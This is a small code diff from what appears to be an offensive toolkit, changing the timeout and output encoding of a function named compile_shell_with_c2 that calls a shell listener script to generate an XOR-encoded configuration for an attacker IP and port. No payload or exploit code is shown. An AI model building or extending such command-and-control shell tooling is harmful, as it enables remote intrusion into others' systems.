@@ -370,7 +370,8 @@ def compile_shell_with_c2(ip, port):
     listener = os.path.join(ROOT, "shell", "vader_listener.py")
     result = subprocess.run(
         [sys.executable, listener, str(port), "--gen"],
-        capture_output=True, text=True, timeout=10,
+        capture_output=True, text=True, timeout=30,
+        encoding="utf-8", errors="replace",
     )
     if result.returncode == 0:
         log_ok(f"XOR config generated for {ip}:{port}")
